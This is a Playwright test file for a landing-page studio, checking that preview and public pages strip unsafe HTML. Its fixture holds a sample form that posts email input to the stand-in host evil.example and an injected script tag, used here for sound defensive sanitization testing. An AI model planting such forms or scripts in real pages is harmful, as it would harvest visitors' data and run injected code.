import { expect, test } from '@playwright/test';
import { mockWorkspaceApis } from './support/workspace-mock';

function apiResponse(data: unknown, pagination?: Record<string, unknown>) {
  return JSON.stringify({
    success: true,
    data,
    ...(pagination ? { pagination } : {}),
  });
}

const unsafeLandingHtml = `
  <section style="padding:24px">
    <h1>Spring Offer</h1>
    <p>Safe public content.</p>
    <form action="https://evil.example/collect"><input name="email"><button type="submit">Send</button></form>
    <script>window.evil = true</script>
  </section>
`;

test('landing page studio saves, publishes, and sanitizes unsafe preview controls', async ({ page }) => {
  let createPayload: Record<string, unknown> | undefined;
  let publishCalled = false;
  const draftPage = {
    id: 'landing-1',
    name: 'Spring Offer',
    slug: 'spring-offer',
    htmlContent: unsafeLandingHtml,
    status: 'DRAFT',
  };
  const publishedPage = { ...draftPage, status: 'PUBLISHED' };

  await mockWorkspaceApis(page);
  await page.route('**/api/v1/landing-pages**', async (route) => {
    const request = route.request();
    const url = new URL(request.url());
    const path = url.pathname.replace('/api/v1', '');

    if (request.method() === 'GET' && path === '/landing-pages') {
      return route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: apiResponse([], { page: 0, size: 100, totalElements: 0, totalPages: 0 }),
      });
    }

    if (request.method() === 'POST' && path === '/landing-pages') {
      createPayload = request.postDataJSON();
      return route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: apiResponse(draftPage),
      });
    }

    if (request.method() === 'POST' && path === '/landing-pages/landing-1/publish') {
      publishCalled = true;
      return route.fulfill({
        status: 200,
        contentType: 'application/json',
        body: apiResponse(publishedPage),
      });
    }

    return route.fallback();
  });

  await page.goto('/app/email/landing-pages');
  await page.getByLabel('Name').fill('Spring Offer');
  await page.getByLabel('Slug').fill('spring-offer');
  await page.locator('textarea').fill(unsafeLandingHtml);

  await expect(page.getByRole('heading', { name: 'Spring Offer' })).toBeVisible();
  await expect(page.locator('main form')).toHaveCount(0);
  await expect(page.locator('main script')).toHaveCount(0);

  await page.getByRole('button', { name: 'Publish' }).click();

  await expect.poll(() => createPayload?.slug).toBe('spring-offer');
  expect(createPayload?.htmlContent).toContain('Spring Offer');
  await expect.poll(() => publishCalled).toBe(true);
});

test('public landing route renders published sanitized HTML without workspace context', async ({ page }) => {
  await page.route('**/api/v1/public/landing-pages/spring-offer', async (route) => {
    return route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: apiResponse({
        id: 'landing-1',
        name: 'Spring Offer',
        slug: 'spring-offer',
        htmlContent: unsafeLandingHtml,
        status: 'PUBLISHED',
      }),
    });
  });

  await page.goto('/lp/spring-offer');

  await expect(page.getByRole('heading', { name: 'Spring Offer' })).toBeVisible();
  await expect(page.getByText('Safe public content.')).toBeVisible();
  await expect(page.locator('main form')).toHaveCount(0);
  await expect(page.locator('main input[name="email"]')).toHaveCount(0);
  await expect(page.locator('main script')).toHaveCount(0);
});
